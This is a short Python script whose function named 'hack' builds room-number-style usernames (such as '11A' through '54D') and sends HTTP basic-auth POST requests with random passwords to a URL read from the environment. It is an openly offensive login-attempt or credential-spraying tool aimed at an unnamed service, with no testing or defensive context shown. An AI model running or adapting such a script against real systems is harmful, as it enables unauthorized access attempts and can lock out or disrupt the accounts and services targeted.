import random, string
import requests
import os

url = os.environ['URL']


def users():
	rooms = []
	for i in range(5):
		rooms.append([(str(x + 10*i) + 'A', str(x + 10*i) + 'B', str(x + 10*i) + 'C', str(x + 10*i) + 'D') 
			for x in [11, 12, 13, 14]])

	rooms = [item for sublist in rooms for item in sublist]
	users = []
	list(map(users.extend, rooms))
	return users


def hack(users):
	for u in users:
		password = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(0, 10)))
		requests.post(url, auth=(u, password))


if __name__ == '__main__':
	hack(users())	
	print("Done")	
